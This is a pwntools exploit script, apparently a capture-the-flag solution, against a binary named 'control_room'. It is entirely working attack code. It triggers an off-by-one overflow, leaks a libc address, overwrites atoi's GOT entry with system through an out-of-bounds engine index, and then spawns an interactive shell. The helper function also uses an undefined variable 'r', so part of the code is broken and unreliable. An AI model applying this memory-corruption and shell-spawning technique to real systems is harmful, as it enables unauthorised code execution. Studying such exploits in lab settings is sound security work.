from pwn import *

context.log_level = 'debug'

elf = ELF('./control_room')
#libc = ELF('./libc.so.6')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def configure_engine(idx, v1=0, v2=0, is_printf=False):
    io.sendline(b'1') # configure Engine
    io.sendline(str(idx).encode())
    if not is_printf:
        io.sendline(str(v1).encode())
        io.sendline(str(v2).encode())
    else:
        io.sendline()
        io.recvuntil(f'[{idx}]:'.encode())
        io.recvuntil(b': ')
        thrust = int(r.recvuntil(b'\t').strip())
        io.recvuntil(b': ')
        mixture = int(r.recvline().strip())
        io.sendline(b'n')
        return thrust, mixture
    io.sendline(b'y')

io = process('./control_room')
#io = gdb.debug('./control_room', 'break view_route')

# Trigger the off-by-one bug
io.send(b'A'*0x100)
io.sendline(b'n')
io.send(b'256')
io.send(b'A'*0x100)

#io.interactive()
#disassamle each number output by view_route() found the first Longitude is atoi + 0x14

# Leak stack UDA, which contains libc address
io.sendline(b'3')
io.sendline(b'xy')

io.sendline(b'4')
io.recvuntil(b'Latitude  : ')
io.recvuntil(b'Latitude  : ')
io.recvuntil(b'Latitude  : ')
io.recvuntil(b'Latitude  : ')
io.recvuntil(b'Latitude  : ')
io.recvuntil(b'Longitude : ')
libc_atoi = int(io.recvline().strip())
libc.address = libc_atoi - (libc.sym['atoi']+0x14)

# Change role to technician
io.sendline(b'5')
io.sendline(b'1')
engines_addr = 0x405120

# Change atoi to system
configure_engine((elf.got['atoi']-engines_addr)//0x10, libc.sym['system'], 0x401150)
io.sendline(b'sh') # Trigger a shell
io.interactive()
